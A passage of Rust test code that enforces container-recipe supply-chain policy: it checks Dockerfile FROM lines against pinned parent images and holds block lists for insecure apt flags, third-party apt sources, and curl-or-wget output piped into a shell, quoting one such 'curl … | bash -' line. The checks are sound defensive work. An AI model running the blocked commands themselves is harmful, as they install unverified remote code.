                    return Err(format!(
                        "{context}: a hash-only exception needs a reason and a reassessment condition"
                    ));
                }
                let evidence = array(&members["evidence"], context)?
                    .iter()
                    .map(|item| text(item, context))
                    .collect::<Result<Vec<_>, _>>()?;
                if evidence.is_empty() {
                    return Err(format!("{context}: a hash-only exception needs evidence"));
                }
                Ok(Verification::HashOnly {
                    reviewed_on,
                    reason,
                    evidence,
                    reassess,
                })
            }
            Some("github-attestation") => {
                let members = exact(
                    value,
                    &[
                        "method",
                        "repository",
                        "signer_workflow",
                        "source_ref",
                        "source_sha",
                        "release_json_sha256",
                        "invocation_url",
                    ],
                    context,
                )?;
                let repository = text(&members["repository"], context)?;
                let signer = text(&members["signer_workflow"], context)?;
                let invocation_url = text(&members["invocation_url"], context)?;
                if repository.is_empty() || invocation_url.is_empty() {
                    return Err(format!("{context}: empty attestation identity"));
                }
                // The trusted identity is this repository and its release
                // workflow, not whatever pair the inventory names: composing the
                // signer from the parsed repository would accept any repository
                // that signs with its own workflow of the same name.
                if repository != RELEASE_REPOSITORY {
                    return Err(format!(
                        "{context}: signer repository is not {RELEASE_REPOSITORY}"
                    ));
                }
                if signer != signer_workflow(RELEASE_REPOSITORY) {
                    return Err(format!(
                        "{context}: signer workflow is not the composed release workflow"
                    ));
                }
                if members["source_ref"].as_str() != Some("refs/heads/main") {
                    return Err(format!("{context}: source ref must be refs/heads/main"));
                }
                Ok(Verification::GithubAttestation {
                    repository,
                    signer_workflow: signer,
                    source_ref: "refs/heads/main".to_owned(),
                    source_sha: SourceRevision::parse(&members["source_sha"], context)?,
                    release_json_sha256: Digest::parse(&members["release_json_sha256"], context)?,
                    invocation_url,
                })
            }
            _ => Err(format!("{context}: unknown verification method")),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct OfficialPin {
    reference: PinnedReference,
    expected_source: String,
    platforms: BTreeMap<String, OfficialPlatform>,
    verification: Verification,
    resolved_on: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ReleasePin {
    reference: PinnedReference,
    version: String,
    platforms: BTreeMap<String, ReleasePlatform>,
    verification: Verification,
    resolved_on: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Pin {
    Official(OfficialPin),
    Release(ReleasePin),
}

impl Pin {
    fn reference(&self) -> &PinnedReference {
        match self {
            Pin::Official(pin) => &pin.reference,
            Pin::Release(pin) => &pin.reference,
        }
    }
}

fn parsed_date(value: &Value, context: &str) -> Result<String, String> {
    let date = text(value, context)?;
    if is_date(&date) {
        Ok(date)
    } else {
        Err(format!("{context}: invalid resolution date"))
    }
}

fn parse_official_pin(name: &str, value: &Value) -> Result<Pin, String> {
    let context = format!("pin {name}");
    let members = exact(
        value,
        &[
            "kind",
            "reference",
            "expected_source",
            "platforms",
            "verification",
            "resolved_on",
        ],
        &context,
    )?;
    if members["kind"].as_str() != Some("docker-official-image") {
        return Err(format!("{context}: unknown pin kind"));
    }
    let reference = PinnedReference::parse(&members["reference"], &context, true)?;
    let expected_source = text(&members["expected_source"], &context)?;
    if expected_source.is_empty() {
        return Err(format!("{context}: expected_source is required"));
    }
    let verification = Verification::parse(&members["verification"], &context)?;
    if !matches!(verification, Verification::HashOnly { .. }) {
        return Err(format!(
            "{context}: an official image carries a reviewed hash-only exception"
        ));
    }
    let mut platforms = BTreeMap::new();
    for (platform, entry) in PLATFORMS.iter().zip(exact_platforms(
        &members["platforms"],
        &["manifest", "revision", "source", "created"],
        &context,
    )?) {
        let source = text(&entry["source"], &context)?;
        let created = text(&entry["created"], &context)?;
        if source.is_empty() || !is_rfc3339(&created) {
            return Err(format!("{context} {platform}: provenance is incomplete"));
        }
        platforms.insert(
            (*platform).to_owned(),
            OfficialPlatform {
                manifest: Digest::parse(&entry["manifest"], &context)?,
                revision: SourceRevision::parse(&entry["revision"], &context)?,
                source,
                created,
            },
        );
    }
    let resolved_on = parsed_date(&members["resolved_on"], &context)?;
    Ok(Pin::Official(OfficialPin {
        reference,
        expected_source,
        platforms,
        verification,
        resolved_on,
    }))
}

fn parse_release_pin(name: &str, value: &Value) -> Result<Pin, String> {
    let context = format!("pin {name}");
    let members = exact(
        value,
        &[
            "kind",
            "reference",
            "version",
            "platforms",
            "verification",
            "resolved_on",
        ],
        &context,
    )?;
    if members["kind"].as_str() != Some("repository-release") {
        return Err(format!("{context}: unknown pin kind"));
    }
    let reference = PinnedReference::parse(&members["reference"], &context, false)?;
    let version = text(&members["version"], &context)?;
    if !is_exact_version(&version) {
        return Err(format!("{context}: invalid release version"));
    }
    let verification = Verification::parse(&members["verification"], &context)?;
    if !matches!(verification, Verification::GithubAttestation { .. }) {
        return Err(format!(
            "{context}: a release pin requires GitHub attestation provenance"
        ));
    }
    let mut platforms = BTreeMap::new();
    for (platform, entry) in PLATFORMS.iter().zip(exact_platforms(
        &members["platforms"],
        &["manifest"],
        &context,
    )?) {
        platforms.insert(
            (*platform).to_owned(),
            ReleasePlatform {
                manifest: Digest::parse(&entry["manifest"], &context)?,
            },
        );
    }
    let resolved_on = parsed_date(&members["resolved_on"], &context)?;
    Ok(Pin::Release(ReleasePin {
        reference,
        version,
        platforms,
        verification,
        resolved_on,
    }))
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Binding {
    Pin(String),
    LocalBase(String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ParentSpec {
    stage: Option<String>,
    binding: Binding,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ParentInventory {
    pins: BTreeMap<String, Pin>,
    recipes: BTreeMap<String, Vec<ParentSpec>>,
}

/// `apt_open_gaps` is the closed record of the two #96 instructions. The key
/// stays in the schema as an empty list because a recorded exception can only
/// describe a third-party apt source, and no maintained recipe may add one any
/// more: an entry is refused outright rather than compared against a recipe, so
/// there is nothing left for a recipe edit to keep alive.
fn require_no_apt_open_gaps(value: &Value) -> Result<(), String> {
    let entries = array(value, "apt_open_gaps")?;
    if let Some(entry) = entries.first() {
        let recipe = entry
            .as_object()
            .and_then(|members| members.get("recipe"))
            .and_then(Value::as_str)
            .unwrap_or("an unnamed recipe");
        return Err(format!(
            "apt_open_gaps is closed: #96 removed the recorded third-party instructions, so \
             {recipe} cannot hold one"
        ));
    }
    Ok(())
}

fn parse_recipes(value: &Value) -> Result<BTreeMap<String, Vec<ParentSpec>>, String> {
    let mut recipes = BTreeMap::new();
    for (path, specs) in object(value, "recipes")? {
        let context = format!("recipe {path}");
        if !path
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || b"._/-".contains(&byte))
        {
            return Err("recipe path must be checkout-relative".into());
        }
        let mut entries = Vec::new();
        let mut stages = BTreeSet::new();
        for spec in array(specs, &context)? {
            let members = object(spec, &context)?;
            let keys: BTreeSet<&str> = members.keys().map(String::as_str).collect();
            let pin_only: BTreeSet<&str> = ["stage", "pin"].into_iter().collect();
            let local_only: BTreeSet<&str> = ["stage", "local_base"].into_iter().collect();
            if keys != pin_only && keys != local_only {
                return Err(format!("{context}: expected stage plus pin or local_base"));
            }
            let stage = match &members["stage"] {
                Value::Null => None,
                value => Some(text(value, &context)?),
            };
            if let Some(name) = &stage
                && !stages.insert(name.clone())
            {
                return Err(format!("{context}: duplicate stage {name}"));
            }
            let binding = match (members.get("pin"), members.get("local_base")) {
                (Some(value), None) => Binding::Pin(text(value, &context)?),
                (None, Some(value)) => Binding::LocalBase(text(value, &context)?),
                _ => return Err(format!("{context}: expected stage plus pin or local_base")),
            };
            entries.push(ParentSpec { stage, binding });
        }
        if entries.is_empty() {
            return Err(format!("{context}: at least one parent is required"));
        }
        recipes.insert(path.clone(), entries);
    }
    Ok(recipes)
}

fn parse_parent_inventory(text_source: &str) -> Result<ParentInventory, String> {
    let value = strict_json(text_source)?;
    let members = exact(
        &value,
        &["schema", "pins", "recipes", "apt_open_gaps"],
        PARENT_INVENTORY,
    )?;
    if members["schema"].as_u64() != Some(1) {
        return Err("unsupported parent inventory schema".into());
    }
    let pin_values = object(&members["pins"], "pins")?;
    if let Some(unknown) = pin_values
        .keys()
        .find(|name| !matches!(name.as_str(), DEBIAN_PIN | GO_PIN | RELEASE_PIN))
    {
        return Err(format!("unknown pin: {unknown}"));
    }
    let mut pins = BTreeMap::new();
    for name in [DEBIAN_PIN, GO_PIN, RELEASE_PIN] {
        let value = pin_values
            .get(name)
            .ok_or_else(|| format!("pin inventory is incomplete: {name}"))?;
        let parsed = if name == RELEASE_PIN {
            parse_release_pin(name, value)?
        } else {
            parse_official_pin(name, value)?
        };
        pins.insert(name.to_owned(), parsed);
    }
    let recipes = parse_recipes(&members["recipes"])?;
    require_no_apt_open_gaps(&members["apt_open_gaps"])?;
    Ok(ParentInventory { pins, recipes })
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct FromInstruction {
    raw_image: String,
    resolved_image: String,
    stage: Option<String>,
    platform: Option<String>,
}

/// Join continuations and drop comment/blank lines, preserving instruction order.
fn dockerfile_instructions(source: &str) -> Vec<String> {
    let mut instructions = Vec::new();
    let mut current = String::new();
    for line in source.lines() {
        let trimmed = line.trim();
        if current.is_empty() && (trimmed.is_empty() || trimmed.starts_with('#')) {
            continue;
        }
        let continued = line.trim_end().ends_with('\\');
        if continued {
            current.push_str(line.trim_end().trim_end_matches('\\'));
        } else {
            current.push_str(line);
        }
        if continued {
            continue;
        }
        if !current.trim().is_empty() {
            instructions.push(current.trim().to_owned());
        }
        current.clear();
    }
    if !current.trim().is_empty() {
        instructions.push(current.trim().to_owned());
    }
    instructions
}

/// Global `ARG NAME=default` declarations, i.e. those before the first `FROM`.
/// A stage-local redeclaration carries no default and must not be mistaken for
/// the global value a `${NAME}` FROM expands to.
fn global_defaults(instructions: &[String]) -> BTreeMap<String, String> {
    let mut defaults = BTreeMap::new();
    for instruction in instructions {
        let upper = instruction.to_ascii_uppercase();
        if upper.starts_with("FROM ") {
            break;
        }
        let split = instruction.split_once(' ');
        let Some(("ARG" | "arg", rest)) = split else {
            continue;
        };
        for declaration in rest.split_whitespace() {
            if let Some((name, value)) = declaration.split_once('=') {
                defaults.insert(name.to_owned(), value.to_owned());
            }
        }
    }
    defaults
}

fn resolve_from_image(raw: &str, defaults: &BTreeMap<String, String>) -> Result<String, String> {
    if !raw.contains('$') {
        return Ok(raw.to_owned());
    }
    let name = raw
        .strip_prefix("${")
        .and_then(|rest| rest.strip_suffix('}'))
        .filter(|name| {
            !name.is_empty()
                && !name.contains('$')
                && !name.contains('{')
                && name
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
        })
        .ok_or_else(|| format!("unresolved or nested FROM expansion: {raw}"))?;
    defaults
        .get(name)
        .cloned()
        .ok_or_else(|| format!("FROM references an undeclared or defaultless ARG: {name}"))
}

fn parse_froms(source: &str) -> Result<Vec<FromInstruction>, String> {
    let instructions = dockerfile_instructions(source);
    let defaults = global_defaults(&instructions);
    let mut froms = Vec::new();
    for instruction in &instructions {
        if !instruction.to_ascii_uppercase().starts_with("FROM ") {
            continue;
        }
        let tokens: Vec<&str> = instruction.split_whitespace().collect();
        let mut index = 1;
        let mut platform = None;
        while let Some(token) = tokens.get(index) {
            if !token.starts_with("--") {
                break;
            }
            if let Some(value) = token.strip_prefix("--platform=") {
                platform = Some(value.to_owned());
            }
            index += 1;
        }
        let raw = tokens
            .get(index)
            .ok_or_else(|| format!("FROM without an image: {instruction}"))?;
        let stage = match (tokens.get(index + 1), tokens.get(index + 2)) {
            (Some(alias), Some(name)) if alias.eq_ignore_ascii_case("as") => {
                Some((*name).to_owned())
            }
            _ => None,
        };
        froms.push(FromInstruction {
            raw_image: (*raw).to_owned(),
            resolved_image: resolve_from_image(raw, &defaults)?,
            stage,
            platform,
        });
    }
    Ok(froms)
}

/// The local base a maintained recipe consumes. Only the copied extension
/// example consumes the base extension; every other recipe the local standard.
fn local_base_for(path: &str) -> &'static str {
    if path.starts_with("examples/base-extension/") {
        "extension"
    } else {
        "standard"
    }
}

/// The pin a resolved FROM image addresses, compared by repository identity.
fn pin_for_image(image: &str) -> Option<&'static str> {
    let name = image.split('@').next().unwrap_or(image);
    let repository = match name.rsplit_once(':') {
        Some((head, tail)) if !tail.contains('/') => head,
        _ => name,
    };
    match repository {
        "debian" => Some(DEBIAN_PIN),
        "golang" => Some(GO_PIN),
        "ghcr.io/gregwebs/agent-vm-standard" => Some(RELEASE_PIN),
        _ => None,
    }
}

fn check_recipe_parents(
    inventory: &ParentInventory,
    recipes: &BTreeMap<String, String>,
) -> Result<(), String> {
    if recipes.keys().ne(inventory.recipes.keys()) {
        return Err(format!(
            "recipe inventory mismatch: inventory [{}], recipes [{}]",
            inventory
                .recipes
                .keys()
                .cloned()
                .collect::<Vec<_>>()
                .join(", "),
            recipes.keys().cloned().collect::<Vec<_>>().join(", ")
        ));
    }
    for (path, source) in recipes {
        let froms = parse_froms(source)?;
        let specs = &inventory.recipes[path];
        if froms.len() != specs.len() {
            return Err(format!(
                "{path}: {} FROM instructions but {} inventory entries",
                froms.len(),
                specs.len()
            ));
        }
        for (instruction, spec) in froms.iter().zip(specs) {
            if instruction.stage != spec.stage {
                return Err(format!("{path}: FROM stage does not match the inventory"));
            }
            match &spec.binding {
                Binding::Pin(name) => {
                    let pin = inventory
                        .pins
                        .get(name)
                        .ok_or_else(|| format!("{path}: unknown pin {name}"))?;
                    let wanted = pin.reference().text();
                    if instruction.resolved_image != wanted {
                        return Err(format!(
                            "{path}: FROM {} is not the pinned {name} reference {wanted}",
                            instruction.resolved_image
                        ));
                    }
                    if !instruction.raw_image.contains('$') && instruction.raw_image != wanted {
                        return Err(format!(
                            "{path}: a literal FROM must stay inside its pinned repository"
                        ));
                    }
                }
                Binding::LocalBase(name) => {
                    if name != local_base_for(path) {
                        return Err(format!(
                            "{path}: local base {name} does not describe this recipe"
                        ));
                    }
                    if instruction.resolved_image != LOCAL_BASE {
                        return Err(format!("{path}: local base must resolve to {LOCAL_BASE}"));
                    }
                    if pin_for_image(&instruction.resolved_image).is_some() {
                        return Err(format!(
                            "{path}: a local base must not address a pinned parent"
                        ));
                    }
                }
            }
        }
    }
    Ok(())
}

/// Instruction blocks with their own bytes: continuations kept, no final LF.
///
/// `dockerfile_instructions` joins continuations and trims whitespace so FROM
/// parsing can work on tokens; a recorded apt gap is an exact exception, so it
/// has to be compared with the recipe's physical text instead.
fn physical_instructions(source: &str) -> Vec<String> {
    let mut instructions = Vec::new();
    let mut current: Vec<&str> = Vec::new();
    for line in source.split('\n') {
        let trimmed = line.trim();
        if current.is_empty() && (trimmed.is_empty() || trimmed.starts_with('#')) {
            continue;
        }
        current.push(line);
        if !line.trim_end().ends_with('\\') {
            instructions.push(current.join("\n"));
            current.clear();
        }
    }
    if !current.is_empty() {
        instructions.push(current.join("\n"));
    }
    instructions
}

/// Markers are compared against [`folded`] text, so they are written folded:
/// lowercase, with no whitespace and no `-` or `_`. Folding collapses the flag
/// and directive spellings of one setting (`--allow-unauthenticated` and
/// `Acquire::AllowUnauthenticated`), which is why each setting appears once.
///
/// Flags and configuration that are never acceptable in a maintained source,
/// whether or not a recorded gap covers the instruction that carries them.
const APT_INSECURE_MARKERS: [&str; 9] = [
    "allowunauthenticated",
    "allowinsecurerepositories",
    "allowdowngradetoinsecurerepositories",
    "forceyes",
    "trusted=yes",
    "trusted:yes",
    "aptkey",
    "addaptrepository",
    "checkvaliduntil",
];

/// Writes or fetches that would install or re-point apt source and key material.
/// Anything here needs a human to record the complete instruction as a gap (#96).
///
/// The tokens are the spellings apt itself uses, not a shell parse: `/etc/apt`
/// with any suffix carries the source, keyring and configuration directories,
/// and the deb822 fields (`Signed-By`, `Types: deb`, `URIs:`) read like the
/// one-line `signed-by=` option once folded. A construction that spells none of
/// these tokens is still a review question.
const APT_SOURCE_MARKERS: [&str; 18] = [
    "/etc/apt",
    "/etc/apt/keyrings",
    "/usr/share/keyrings",
    "sources.list",
    ".sources",
    "signedby",
    "trusted.gpg",
    "uris:",
    "types:deb",
    "dir::etc",
    "aptconfig",
    "debhttp",
    "debsrc",
    "deb[",
    "nodesource",
    "setup22.x",
    "cli.github.com",
    "githubcli",
];

/// The exact wording every "no apt source" refusal carries, so the tests assert
/// one reason rather than a sentence they would otherwise have to keep in step.
const APT_SOURCE_REFUSAL: &str = "apt source or key installation is not accepted";

/// Case, separators and whitespace are spelling, not meaning: `Signed-By`,
/// `Signed_By` and `Signed By` all name the same apt field, and a marker that
/// required one of them would be a guard that a re-spelling defeats.
fn folded(text: &str) -> String {
    text.chars()
        .filter(|character| !character.is_whitespace() && *character != '-' && *character != '_')
        .flat_map(char::to_lowercase)
        .collect()
}

fn marker_in(markers: &[&'static str], text: &str) -> Option<&'static str> {
    let folded = folded(text);
    markers
        .iter()
        .find(|marker| folded.contains(**marker))
        .copied()
}

fn apt_insecure_marker(text: &str) -> Option<&'static str> {
    marker_in(&APT_INSECURE_MARKERS, text)
}

fn apt_source_marker(text: &str) -> Option<&'static str> {
    marker_in(&APT_SOURCE_MARKERS, text)
}

/// A static ratchet, not a sandbox: no maintained instruction or shell line may
/// write apt source or key state. Both exceptions were removed with their
/// installers (#96), so there is no reviewed position left to hold. The
/// parent-baseline checker owns the state the pinned Debian parent ships; this
/// gate owns what the recipes add on top of it.
///
/// Markers are matched against the whole instruction, so a RUN's shell text and a
/// COPY/ADD destination are both covered: `COPY apt /etc/apt` writes the source
/// directory without naming a shell command.
fn check_apt_sources(
    recipes: &BTreeMap<String, String>,
    shell_sources: &BTreeMap<String, String>,
) -> Result<(), String> {
    for (path, source) in recipes {
        for instruction in physical_instructions(source) {
            if let Some(marker) = apt_insecure_marker(&instruction) {
                return Err(format!(
                    "{path}: insecure apt construction is never accepted: {marker}"
                ));
            }
        }
    }
    for (path, source) in recipes {
        for instruction in physical_instructions(source) {
            if let Some(marker) = apt_source_marker(&instruction) {
                return Err(format!(
                    "{path}: {APT_SOURCE_REFUSAL} (owner #96): {marker}"
                ));
            }
        }
    }
    for (path, source) in shell_sources {
        for line in source.split('\n') {
            let code = strip_comment(line);
            if code.trim().is_empty() {
                continue;
            }
            if let Some(marker) = apt_insecure_marker(code) {
                return Err(format!(
                    "{path}: insecure apt construction is never accepted: {marker}"
                ));
            }
            if let Some(marker) = apt_source_marker(code) {
                return Err(format!(
                    "{path}: {APT_SOURCE_REFUSAL} (owner #96): {marker}"
                ));
            }
        }
    }
    Ok(())
}

/// A maintained recipe must not run a script it just downloaded. The removed
/// NodeSource instruction did exactly that (`curl …/setup_22.x | bash -`); its
/// replacement is an archive whose bytes are hashed against a committed pin. The
/// pipe is matched on shell words, not on a substring, so `curl … | sha256sum -c`
/// stays legal while `| bash`, `| sh`, `| /bin/sh`, `| sudo bash` and `| dash`
/// are refused. Like the apt ratchet this is a static catch for known spellings,
/// not a shell parser: an interpreter reached through `xargs` or a variable is
/// still a review question.
const SHELL_PROGRAMS: [&str; 3] = ["bash", "sh", "dash"];

/// The program a pipeline segment would run, skipping the wrappers and
/// assignments that do not change which program is executed: `sudo -E bash`,
/// `env FOO=1 sh`, `exec dash`. Matching only the first word let `| env sh`
/// through.
fn shell_program(segment: &str) -> Option<String> {
    for word in shell_words(segment) {
        // A pipeline embedded in a quoted program text (`os.system("curl … | sh")`)
        // leaves the closing quote attached, so the name is the leading identifier.
        let bare = word.text.rsplit('/').next().unwrap_or(&word.text);
        let name: String = bare
            .chars()
            .take_while(|character| {
                character.is_ascii_alphanumeric() || matches!(character, '_' | '.' | '-')
            })
            .collect();
        if name.is_empty() || name.starts_with('-') {
            continue;
        }
        if matches!(
            name.as_str(),
            "sudo" | "env" | "exec" | "command" | "nohup" | "nice"
        ) {
            continue;
        }
        return Some(name);
    }
    None
}

fn pipes_into_shell(instruction: &str) -> bool {
    let joined = instruction.replace('\n', " ");
    if !(joined.contains("curl") || joined.contains("wget")) {
        return false;
    }
    joined.split('|').skip(1).any(|segment| {
        shell_program(segment).is_some_and(|name| SHELL_PROGRAMS.contains(&name.as_str()))
    })
}

/// One instruction as simple commands: line continuations joined, comments
/// dropped, quoting honoured, splits at the shell separators. The apt and pipe
/// rules need words, not substrings - `apt-get -y install nodejs` and a
/// continuation before `install` both defeat a literal `"apt-get install"`.
fn instruction_commands(instruction: &str) -> Vec<Vec<String>> {
    let joined = instruction.replace("\\\n", " ").replace('\\', " ");
    let mut commands = Vec::new();
    for line in joined.split('\n') {
        for command in split_commands(strip_comment(line)) {
            let mut words: Vec<String> = shell_words(&command)
                .into_iter()
                .map(|word| word.text)
                .filter(|word| !word.is_empty())
                .collect();
            // The Dockerfile instruction keyword is not a command word.
            if words.first().is_some_and(|word| {
                matches!(
                    word.as_str(),
                    "RUN" | "COPY" | "ADD" | "ENV" | "LABEL" | "CMD" | "ENTRYPOINT" | "SHELL"
                )
            }) {
                words.remove(0);
            }
            if !words.is_empty() {
                commands.push(words);
            }
        }
    }
    commands
}

fn check_no_piped_remote_script(
    recipes: &BTreeMap<String, String>,
    helpers: &BTreeMap<String, String>,
) -> Result<(), String> {
    for (path, source) in recipes.iter().chain(helpers) {
        for instruction in physical_instructions(source) {
            if pipes_into_shell(&instruction) {
                return Err(format!(
                    "{path}: a downloaded script may not be executed through a pipe (#96); \
                     pin the artifact instead"
                ));
            }
        }
    }
    Ok(())
}

/// The package names apt must never be asked for. `node`, `nodejs`, `npm` and
/// `npx` are Node's and `gh` is the GitHub CLI's; all of them arrived through a
/// floating third-party source until #96 replaced them with the pins.
const ARTIFACT_PACKAGES: [&str; 5] = ["node", "nodejs", "npm", "npx", "gh"];

const APT_PROGRAMS: [&str; 3] = ["apt-get", "apt", "aptitude"];
const APT_INSTALL_VERBS: [&str; 2] = ["install", "reinstall"];
/// Options that take the *next* word as their value, so it is not the verb.
const APT_VALUE_OPTIONS: [&str; 5] = ["-o", "-c", "-t", "--option", "--config-file"];

/// The package a word asks for, whichever way apt spells it: `nodejs:amd64`,
/// `nodejs=22.0.0`, `'nodejs*'`, `nodejs+`, `"gh"`. Quoting is already removed
/// by the tokeniser; the qualifiers and globs are stripped here.
fn protected_package(word: &str) -> Option<String> {
    let mut name = word.trim_matches(|character| character == '\'' || character == '"');
    if let Some((before, _)) = name.split_once('=') {
        name = before;
    }
    if let Some((before, _)) = name.split_once(':') {
        name = before;
    }
    let name = name.trim_end_matches(['*', '?', '+', '-', '.']);
    if ARTIFACT_PACKAGES.contains(&name) {
        return Some(name.to_owned());
    }
    None
}

fn apt_package_offence(instruction: &str) -> Option<String> {
    for words in instruction_commands(instruction) {
        let mut index = 0;
        // Wrappers and assignments before the program: `sudo apt-get`, `env X=1 apt-get`.
        while let Some(word) = words.get(index) {
            let name = word.rsplit('/').next().unwrap_or(word);
            if matches!(name, "sudo" | "env" | "exec" | "command" | "nohup")
                || (word.contains('=') && !word.starts_with('-'))
            {
                index += 1;
                continue;
            }
            break;
        }
        let Some(program) = words
            .get(index)
            .map(|word| word.rsplit('/').next().unwrap_or(word).to_owned())
        else {
            continue;
        };
        if !APT_PROGRAMS.contains(&program.as_str()) {
            continue;
        }
        index += 1;
        // Options may precede the verb.
        while let Some(word) = words.get(index) {
            if !word.starts_with('-') {
                break;
            }
            index += if APT_VALUE_OPTIONS.contains(&word.as_str()) {
                2
            } else {
                1
            };
        }
        let Some(verb) = words.get(index) else {
            continue;
        };
        if !APT_INSTALL_VERBS.contains(&verb.as_str()) {
            continue;
        }
        for word in &words[index + 1..] {
            if word.starts_with('-') {
                continue;
            }
            if let Some(package) = protected_package(word) {
                return Some(package);
            }
        }
    }
    None
}

fn check_no_apt_artifact_package(
    recipes: &BTreeMap<String, String>,
    helpers: &BTreeMap<String, String>,
) -> Result<(), String> {
    for (path, source) in recipes.iter().chain(helpers) {
        for instruction in physical_instructions(source) {
            if let Some(package) = apt_package_offence(&instruction) {
                return Err(format!(
                    "{path}: apt may not install {package}: Node and the GitHub CLI come \
                     from images/artifacts (#96)"
                ));
            }
        }
    }
    Ok(())
}

/// A maintained recipe may not download an archive and unpack it by hand: that is
/// the installation surface `images/install-artifact.sh` exists to own, with a
/// committed digest checked before extraction. A hand-rolled
/// `curl ... -o x && tar -xf x` (or an `ADD`ed tarball) has no such review.
const EXTRACT_COMMANDS: [&str; 5] = ["tar", "unzip", "gunzip", "zcat", "bsdtar"];

fn downloads_an_archive(instruction: &str) -> bool {
    let upper = instruction.to_ascii_uppercase();
    if upper.starts_with("ADD ")
        && (instruction.contains("http://") || instruction.contains("https://"))
    {
        return true;
    }
    if !(instruction.contains("curl") || instruction.contains("wget")) {
        return false;
    }
    [".tar.gz", ".tar.xz", ".tgz", ".zip", ".tar"]
        .iter()
        .any(|suffix| instruction.contains(suffix))
}

fn extracts_an_archive(instruction: &str) -> bool {
    instruction_commands(instruction).iter().any(|words| {
        words.iter().any(|word| {
            let name = word.rsplit('/').next().unwrap_or(word);
            EXTRACT_COMMANDS.contains(&name)
                && words
                    .iter()
                    .any(|flag| flag.starts_with('-') && flag.contains('x'))
        })
    })
}

fn check_no_manual_archive_install(recipes: &BTreeMap<String, String>) -> Result<(), String> {
    for (path, source) in recipes {
        for instruction in physical_instructions(source) {
            if downloads_an_archive(&instruction) && extracts_an_archive(&instruction) {
                return Err(format!(
                    "{path}: a downloaded archive may not be unpacked by hand (#96); \
                     install it through images/install-artifact.sh with a committed pin"
                ));
            }
        }
    }
    Ok(())
}

/// Every #96 recipe rule in one place: no apt source or key material, no
/// downloaded script on a pipe, and no Node or gh package through apt.
fn check_legacy_install_paths(
    recipes: &BTreeMap<String, String>,
    helpers: &BTreeMap<String, String>,
) -> Result<(), String> {
    check_apt_sources(recipes, helpers)?;
    check_no_piped_remote_script(recipes, helpers)?;
    check_no_apt_artifact_package(recipes, helpers)?;
    check_no_manual_archive_install(recipes)
}

#[test]
fn external_image_inputs_resolve_through_the_inventory() {
    let inventory = parse_parent_inventory(&read_text(PARENT_INVENTORY)).unwrap();
    let recipes = maintained_recipes();
    check_image_inputs(&recipes, &inventory).unwrap();
    let base = recipes["images/Dockerfile"].clone();
    let standard = recipes["images/standard/Dockerfile"].clone();
    let parent = inventory.pins[DEBIAN_PIN].reference().text();

    // The two spellings a reviewer used to smuggle a floating Node in, plus a
    // digest that is not a reviewed parent.
    let mutations: Vec<(&str, BTreeMap<String, String>, &str)> = vec![
        (
            "an external COPY --from",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!("{base}COPY --from=node:22 /usr/local/ /usr/local/\n"),
            ),
            "--from=node:22",
        ),
        (
            "an external RUN --mount=from",
            edited_recipe(
                &recipes,
                "images/standard/Dockerfile",
                &standard,
                &format!(
                    "{standard}RUN --mount=from=node:22,source=/usr/local,target=/mnt/node \\\n    cp -a /mnt/node/. /usr/local/\n"
                ),
            ),
            "--from=node:22",
        ),
        (
            "a quote-wrapped RUN --mount=from",
            edited_recipe(
                &recipes,
                "images/standard/Dockerfile",
                &standard,
                &format!(
                    "{standard}RUN --mount='from=node:22,source=/usr/local,target=/mnt/node' \\\n    cp -a /mnt/node/. /usr/local/\n"
                ),
            ),
            "--from=node:22",
        ),
        (
            "a double-quoted RUN --mount=from",
            edited_recipe(
                &recipes,
                "images/standard/Dockerfile",
                &standard,
                &format!(
                    "{standard}RUN --mount=\"from=node:22,target=/mnt/node\" cp -a /mnt/node/. /usr/local/\n"
                ),
            ),
            "--from=node:22",
        ),
        (
            "a type=image mount source",
            edited_recipe(
                &recipes,
                "images/standard/Dockerfile",
                &standard,
                &format!(
                    "{standard}RUN --mount=type=image,source=node:22,target=/mnt/node cp -a /mnt/node/. /usr/local/\n"
                ),
            ),
            "node:22",
        ),
        (
            "an unpinned external image",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!("{base}COPY --from=debian:13-slim /usr/local/ /usr/local/\n"),
            ),
            "--from=debian:13-slim",
        ),
        (
            "a digest that is not in the inventory",
            edited_recipe(
                &recipes,
                "images/Dockerfile",
                &base,
                &format!(
                    "{base}COPY --from=debian:13-slim@sha256:{} /usr/local/ /usr/local/\n",
                    "0".repeat(64)
                ),
            ),
            "not in",
        ),
    ];
    for (label, edited, needle) in mutations {
        let error = check_image_inputs(&edited, &inventory)
            .expect_err(&format!("accepted an unresolved image input: {label}"));
        assert!(error.contains(needle), "{label}: {error}");
        assert!(
            error.contains("#96") || error.contains("not in"),
            "{label}: {error}"
        );
    }
    // A declared stage, a stage index and a reviewed parent digest all stay legal.
    for allowed in [
        format!("{base}COPY --from=recipe-contract-bin /out/recipe-contract /tmp/x\n"),
        format!("{base}COPY --from=0 /out/recipe-contract /tmp/x\n"),
        format!("{base}COPY --from={parent} /usr/local/ /tmp/x\n"),
    ] {
        let mut edited = recipes.clone();
        edited.insert("images/Dockerfile".to_owned(), allowed);
        check_image_inputs(&edited, &inventory).unwrap();
    }
}

#[test]
fn the_base_recipe_brackets_package_steps_with_the_apt_baseline() {
    let recipes = maintained_recipes();
    let base = recipes["images/Dockerfile"].clone();
    check_apt_baseline_brackets_build(&base).unwrap();
    assert_eq!(
        base.matches("apt-policy/check-sources.sh").count(),
        2,
        "the base recipe checks the apt sources twice"
    );
    let baseline = "RUN --mount=type=bind,source=apt-policy,target=/tmp/apt-policy,ro \\\n    bash /tmp/apt-policy/check-sources.sh --policy /tmp/apt-policy\n";
    let mutations: Vec<(&str, String)> = vec![
        ("the baseline check deleted", base.replacen(baseline, "", 1)),
        (
            "the final check deleted",
            base.replacen(baseline, "", 1).replacen(baseline, "", 1),
        ),
        (
            // A package step after the final check: the built image's source set
            // would no longer be the one that was checked.
            "a package step after the final check",
            base.replacen(
                "\n# Nothing above proves which sources this base consumed",
                "\nRUN apt-get update && apt-get install -y zsh\n\n# Nothing above proves \
                 which sources this base consumed",
                1,
            ),
        ),
    ];
    for (label, edited) in mutations {
